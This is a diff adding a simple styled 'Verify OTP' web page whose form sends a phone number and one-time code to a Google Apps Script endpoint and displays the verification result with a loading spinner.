@@ -1,0 +1,113 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8" />  
+  <title>Verify OTP</title>  
+  <style>  
+    body {
+      background: #efe;
+      font-family: Arial, sans-serif;
+    }
+
+    h2 {
+      color: navy;
+    }
+
+    input {
+      border-radius: 10px;
+      outline: none;
+      border: 1px solid black;
+      height: 25px;
+      text-align: center;
+      width: 300px;
+      box-shadow: 0px 2px 3px grey;
+    }
+
+    button {
+      background: green;
+      color: #fff;
+      border-radius: 20px;
+      width: 120px;
+      height: 40px;
+      border: 1px solid white;
+      font-weight: bold;
+      position: relative;
+    }
+
+    .spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid white;
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 0.8s linear infinite;
+      position: absolute;
+      top: 8px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: translateX(-50%) rotate(0deg); }
+      100% { transform: translateX(-50%) rotate(360deg); }
+    }
+
+    #result {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>  
+</head>  
+<body>  
+<center>  
+  <h2>VERIFICATION</h2>  
+  <form id="verifyForm">  
+    <input type="text" name="phone" placeholder="Enter Phone Number (e.g. 08012345678)" required /><br><br>  
+    <input type="text" name="otp" placeholder="Enter OTP" required /><br><br>  
+
+    <button type="submit" id="verifyBtn">
+      <span id="btnText">Verify</span>
+      <div class="spinner" id="loader"></div>
+    </button>  
+
+    <p id="result"></p>  
+  </form>  
+</center>  
+
+<script>  
+  document.getElementById("verifyForm").addEventListener("submit", function (e) {  
+    e.preventDefault();  
+    const formData = new FormData(e.target);  
+
+    const button = document.getElementById("verifyBtn");
+    const loader = document.getElementById("loader");
+    const btnText = document.getElementById("btnText");
+
+    // Show loader
+    loader.style.display = "block";
+    btnText.style.visibility = "hidden";
+    button.disabled = true;
+
+    fetch("https://script.google.com/macros/s/AKfycbzXbPLc2fCdeoOnLCv9qzI5I_tQqcKJscYcABiVOFVEaS5nD4eaEYvqO-I7NCE4e07t/exec", {  
+      method: "POST",  
+      body: formData  
+    })  
+    .then(res => res.text())  
+    .then(result => {  
+      document.getElementById("result").innerText = result;  
+      document.getElementById("result").style.color = result.includes("✅") ? "green" : "red";
+    })  
+    .catch(() => {  
+      document.getElementById("result").innerText = "Error verifying OTP.";  
+      document.getElementById("result").style.color = "red";  
+    })  
+    .finally(() => {
+      loader.style.display = "none";
+      btnText.style.visibility = "visible";
+      button.disabled = false;
+    });
+  });  
+</script>  
+</body>  
+</html>
